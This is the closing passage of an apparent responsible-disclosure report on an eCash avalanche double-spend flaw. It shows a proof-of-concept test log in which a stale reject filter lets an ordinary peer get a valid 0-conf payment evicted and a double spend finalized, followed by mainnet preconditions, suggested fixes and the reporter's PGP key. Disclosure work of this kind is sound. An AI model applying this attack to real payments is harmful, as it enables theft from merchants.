2026-08-19T16:59:36.288000Z TestFramework (INFO):   -> control tx survived 10s of polling unflipped (M flipped in seconds) and is not finalized: no seeding, no rejection
2026-08-19T16:59:39.686000Z TestFramework (INFO):   -> control tx finalized normally after organic delivery to the quorum
2026-08-19T16:59:39.686000Z TestFramework (INFO): RESULT: with a fully real 16-node quorum, an unprivileged peer seeded txid(M) into every quorum member's m_recent_rejects via a temporal rejection; the documented chain-tip reset never ran; the real victim's own polls harvested organic INVALID votes that evicted the valid payment it had accepted, admitted the double-spend D, and finalized D via preconsensus. The unseeded control payment was never rejected and finalized normally. Amount at risk = full value of any targeted 0-conf payment.
2026-08-19T16:59:39.737000Z TestFramework (INFO): Stopping nodes
2026-08-19T16:59:40.356000Z TestFramework (INFO): Cleaning up /var/folders/pn/lzm1slcd5212fnnkz_p8hb2c0000gn/T/bitcoin_func_test_2lbvhu2r on exit
2026-08-19T16:59:40.357000Z TestFramework (INFO): Tests successful
```

The run reproduces the whole chain deterministically: 16 real quorum nodes are seeded, every one votes INVALID on the now valid payment, the victim evicts the payment it had accepted, admits the conflicting double spend, and finalizes it through preconsensus, while the unseeded control payment finalizes normally.

## 7. Preconditions and limitations

* The attacker is an ordinary peer. The seed uses `TX_PREMATURE_SPEND`, which carries no misbehavior penalty ([src/net_processing.cpp#L2763-L2790](https://github.com/Bitcoin-ABC/bitcoin-abc/blob/28c310db31248991c41559c1cd9e057bcc577594/src/net_processing.cpp#L2763-L2790)), so seeding cannot get them banned. No privileged RPC, no operator misconfiguration.
* For a clean deterministic proof the test uses a coinbase spend that matures one block later. That is the simplest transaction whose validity flips on a single block, which makes the poison window easy to reproduce. The same primitive works on anything that becomes valid on a tip change, say a timelocked spend or a spend of an output created in the block that just connected, because the reject filter is not reset on block connection and the avalanche vote reads it first.
* In the real quorum test the block relay only links are what make the poison durable without any timing assumption. On a live network the attacker does not need that particular link type. The reset only fires when a transaction relay event, an `INV` or `TX` for any txid, reaches `AlreadyHaveTx` after the block, and eCash mainnet plays into the attacker's hands here: it often runs at low throughput with nearly empty blocks, so a node can go minutes between relay events. The stale window after a block then routinely lasts far longer than the victim's avalanche poll cycle, which runs every 10 ms ([src/avalanche/processor.cpp#L33-L35](https://github.com/Bitcoin-ABC/bitcoin-abc/blob/28c310db31248991c41559c1cd9e057bcc577594/src/avalanche/processor.cpp#L33-L35)) and flips the vote in well under a second. The poison sticks on its own on any node that sees no relay traffic in that window; the block relay only setup just removes the last bit of race so the proof is deterministic.
* Everything is on regtest, no mainnet or testnet execution, per the disclosure policy. Node counts, proofs and quorum are all real `bitcoind` processes. No transaction vote is scripted.

## 8. Suggested fix

The root problem is that a best effort bandwidth filter is being read as the first gate of a consensus vote, and its documented reset does not run on the transition that matters.

* Reset `m_recent_rejects` on block connection, not just on the transaction relay path, so the "reset on tip change" contract actually holds after every block. Same thing put differently: move the refresh check out of `AlreadyHaveTx` and into somewhere that runs on `UpdatedBlockTip`.
* In `GetAvalancheVoteForTx`, do not let a `m_recent_rejects` hit short circuit to INVALID ahead of the mempool and finalization checks. A transaction that is in the mempool, or currently valid, should not be voted INVALID over a stale reject entry. Checking the mempool and current validity before the reject filter removes the divergence.
* Consider splitting the reasons a txid lands in the reject filter. A permanent consensus failure and a temporal one like a premature spend are different things; only the former should be usable as an INVALID vote, and even then only if it is still true under the current tip.

Any one of these closes the chain. The first two together are the most direct.

## 9. Reporter

* Name: Adeola
* Contact email: adeolasola01@gmail.com
* PGP fingerprint for encrypted response: `873605579C70210574E4B2A61DF11EE67D0C5C77` (RSA 4096)

My public key, so you can encrypt your reply:

```
-----BEGIN PGP PUBLIC KEY BLOCK-----

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
=wsjU
-----END PGP PUBLIC KEY BLOCK-----
```
